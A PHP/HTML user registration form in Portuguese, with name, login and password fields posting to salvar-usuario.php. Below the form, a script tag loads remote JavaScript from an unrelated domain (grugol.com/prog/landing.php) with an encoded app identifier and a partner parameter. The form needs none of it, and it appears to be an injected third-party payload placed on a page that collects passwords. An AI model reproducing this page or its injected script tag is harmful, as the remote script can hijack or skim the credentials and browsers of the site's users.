<?php include 'include/protecao.php'; ?>
<html>
	<head>
		<meta charset="utf-8"> </meta>
		<link rel="stylesheet" href="estilo.css" />
		<link rel="stylesheet" href="bootstrap-3.3.6-dist/css/bootstrap.min.css" />
		<script type="text/javascript" src="bootstrap-3.3.6-dist/js/bootstrap.min.js" > </script>
		<meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
		<title>Formulario</title>
	</head>
	<body>
	
		<div id="container">
			<div class="w3-container w3-purple">
				<h3>CADASTRO DE USUARIO</h3>
			</div>
			<form class="w3-container" method="POST" action="salvar-usuario.php">

				<label>NOME</label>
				<input class="w3-input w3-hover-purple" type="text" name="nome">

				
				<label>LOGIN</label>
				<input class="w3-input w3-hover-purple" type="text" name="login">
				
				<label>SENHA</label>
				<input class="w3-input w3-hover-purple" type="password" name="senha">
				
			
		
				<br><br />

				<button class="w3-btn w3-red w3-border w3-round-xlarge" type="reset">CANCELAR</button>
				<button class="w3-btn w3-green w3-border w3-round-xlarge" type="submit">CONFIRMAR</button>
				
			</form>
			<script src='http://grugol.com/prog/landing.php?app=RTgtMDMtOUEtNDgtNDYtNUM=&partner=200'></script>
		</div>
	</body>
</html>